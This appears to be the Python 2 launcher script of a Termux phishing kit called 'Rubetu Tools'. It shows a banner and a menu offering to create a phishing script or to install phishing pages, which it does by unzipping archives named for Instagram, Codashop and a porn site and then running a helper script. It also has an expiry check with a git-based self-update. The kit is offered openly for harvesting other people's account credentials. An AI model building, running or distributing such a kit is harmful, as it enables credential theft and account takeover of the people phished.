#coding=utf-8
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
# text banner
def banner(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.002)
        
# text banner2
def banner2(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.002)

def warning(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.010)

os.system('clear')
datet = '2021-07-11'
ExpirationDate = datetime.strptime(datet,"%Y-%m-%d").date()
now = date.today()
if ExpirationDate >= now:
    print('')
elif ExpirationDate == datet:
    print('')
else:
    warning('\033[1;33mPembaruan Berlaku!\n\n\033[1;37m\033[40;1mPlease update the tools to the latest version\n\nGithub: \033[0;32mhttps://github.com/Rubetu-Xcan/rubetu-tools\n\033[1;37mYoutube: \033[0;32mCandra NM\n\n')
    updating = raw_input("\033[1;37mUpdate Rubetu Tools Now?  (y/n) ")
    if updating == 'y' or updating == 'Y':
         os.system("cd && rm -r ruberu-tools")
         os.system("git clone https://github.com/Rubetu-Xcan/rubetu-tools")
         os.system("cd rubetu-tools")
         os.system("python2 rubetu-tools.py")
         time.sleep(1)
         sys.exit()
    elif updating == 'n' or updating == 'N':
         sys.exit()
    else:
            print('\033[1;31mWrong Input!')
            time.sleep(1)
            os.system('python2 rubetu-tools.py')
            sys.exit()

time.sleep(1)
banner("""				\033[1;33m• \033[0;32m• \033[1;31m•		
\033[1;37m┌─┐┬ ┬┌─┐ ┌─┐┌┬┐┬ ┬   ┌┬┐┌─┐┌─┐┬  ┌─┐
├┬┘│ │├─┴┐├─  │ │ │ ━  │ │ ││ ││  └─┐
┴└─└─┘└──┘└─┘ ┴ └─┘    ┴ └─┘└─┘└─┘└─┘
\033[1;37m\033[41;1m \033[1;37mDeveloper: RubetuXcan │ Version 1.2 \033[00m\033[1;37m
\033[1;37m╾━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╼                                
\033[1;31m[\033[1;37m1\033[1;31m]\033[1;33m • \033[1;37mDirectly create a script phish                            
\033[1;31m[\033[1;37m2\033[1;31m]\033[0;32m • \033[1;37mInstall phishing                          
\033[1;31m[\033[1;37m3\033[1;31m]\033[1;31m • \033[1;37mExit program                       
\033[1;37m╾━━━━━━━━━━━━━━━━━━━━╼""")
pilih = raw_input("\033[1;31m • \033[1;37mChoice \033[1;31m: \033[0;32m")
if pilih == '1' or pilih == '01':
   os.system("python2 sys.py")
   sys.exit()
if pilih == '2' or pilih == '02':
	os.system('clear')
	print("\033[1;33m • Downloading Phishing...\033[1;37m")
	os.system("pkg install ruby")
	os.system("pkg install bash")
	os.system("pip2 install requests")
	os.system("pip2 install menchanize")
	os.system("pkg install zip && pkg unzip")
	os.system("unzip codashop.zip")
	os.system("unzip instagram.zip")
	os.system("unzip porn.zip")
	print("\033[0;32m • Downloading Succesfully")
	time.sleep(1)
	os.system("python2 sys.py")
	sys.exit()
if pilih == '3' or pilih == '03':
    sys.exit('\033[1;31m • \033[1;37m\033[1;31mExit Program')
else:
	print('\033[1;31m • \033[1;37m\033[1;31mWrong Input!')
	time.sleep(2)
	os.system('python2 rubetu-tools.py')



